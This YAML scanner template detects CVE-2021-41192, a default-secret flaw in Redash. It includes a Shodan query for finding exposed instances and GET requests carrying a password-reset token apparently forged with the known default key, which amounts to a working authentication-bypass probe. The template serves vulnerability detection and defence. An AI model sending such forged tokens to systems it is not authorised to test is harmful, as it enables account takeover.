id: CVE-2021-41192

info:
  name: Redash Setup Configuration - Default secrets
  author: bananabr
  severity: critical
  description: If an admin sets up Redash versions <=10.0 and prior without explicitly specifying the `REDASH_COOKIE_SECRET` or `REDASH_SECRET_KEY` environment variables, a default value is used for both that is the same across all installations. In such cases, the instance is vulnerable to attackers being able to forge sessions using the known default value.
  reference:
    - https://hackerone.com/reports/1380121
    - https://github.com/getredash/redash/security/advisories/GHSA-g8xr-f424-h2rv
    - https://nvd.nist.gov/vuln/detail/CVE-2021-41192
  metadata:
    shodan-query: http.favicon.hash:247321068
  tags: cve,cve2021,redash,auth-bypass

requests:
  - method: GET
    path:
      - "{{BaseURL}}/reset/IjEi.YhAmmQ.cdQp7CnnVq02aQ05y8tSBddl-qs"
      - "{{BaseURL}}/redash/reset/IjEi.YhAmmQ.cdQp7CnnVq02aQ05y8tSBddl-qs"
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "password"
      - type: status
        status:
          - 200
